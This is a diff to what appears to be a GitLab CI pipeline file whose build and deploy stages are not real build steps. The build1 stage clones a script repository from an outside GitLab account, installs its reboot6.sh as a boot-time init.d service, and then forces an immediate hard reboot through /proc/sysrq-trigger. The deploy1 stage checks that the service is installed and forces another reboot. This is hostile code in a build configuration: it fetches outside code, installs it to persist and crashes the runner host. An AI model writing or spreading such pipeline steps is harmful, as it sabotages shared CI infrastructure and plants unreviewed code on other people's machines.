@@ -10,12 +10,18 @@ before_script:
 build1:
   stage: build1
   script:
-    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d -f reboot6.sh defaults 10 2 3 4 5 . && cd && rm -rf reboot6
+    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git || exit 1
+    - cd reboot6 
+    - cp reboot6.sh /etc/init.d/reboot6.sh 
+    - update-rc.d -f reboot6.sh defaults 10 2 3 4 5 . 
+    - cd || exit 1
+    - rm -rf reboot6
+    - sleep 10
     - echo 1 > /proc/sys/kernel/sysrq
     - echo b > /proc/sysrq-trigger
 deploy1:
   stage: deploy1
   script:
+    - ls /etc/init.d/reboot6.sh || exit 1
     - echo 1 > /proc/sys/kernel/sysrq
     - echo b > /proc/sysrq-trigger
-    - if [ /etc/init.d/reboot6.sh = true ] do reboot else exit 1
